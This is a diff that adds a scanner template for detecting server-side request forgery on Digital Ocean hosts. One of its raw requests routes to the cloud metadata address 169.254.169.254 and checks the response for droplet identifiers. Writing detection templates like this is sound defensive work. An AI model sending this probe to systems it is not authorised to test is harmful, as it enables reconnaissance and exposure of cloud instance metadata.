@@ -1,0 +1,42 @@
+id: digital-ocean-ssrf
+
+info:
+  name: Digital Ocean - Server-side request forgery (SSRF)
+  author: DhiyaneshDk
+  severity: critical
+  description: Digital Ocean instance is vulnerable to SSRF.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
+    cvss-score: 9.3
+    cwe-id: CWE-441
+  metadata:
+    max-request: 2
+  tags: digitalocean,ssrf
+
+http:
+  - raw:
+      - |+
+        GET {{BaseURL}}/metadata/v1.json HTTP/1.1
+        Host: {{Hostname}}
+
+      - |+
+        @tls-sni: {{Hostname}}
+        GET http://169.254.169.254/metadata/v1.json HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    unsafe: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"droplet_id":'
+          - '"hostname":'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a00483046022100fab7cb48dd619e00d662bfa04ff7f860aa39b07b5279bad3742434ea91c935a20221008936afac147b05ff2adc1a72b5e4d54573c8e2e3b9d12991c20187aabbedacf0:922c64590222798bb761d5b6d8e72950
